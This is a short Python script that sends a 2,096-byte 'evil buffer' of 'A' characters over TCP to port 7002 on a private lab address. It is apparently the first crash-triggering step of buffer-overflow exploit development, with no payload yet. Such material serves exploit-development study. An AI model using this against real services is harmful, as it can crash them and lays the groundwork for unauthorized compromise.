#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  buffer = "A" * 0x830

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.1.156", 7002))
  s.send(buffer)
  
  s.close()

  print "\nDone!"
  
except:
  print "\nCould not connect!"

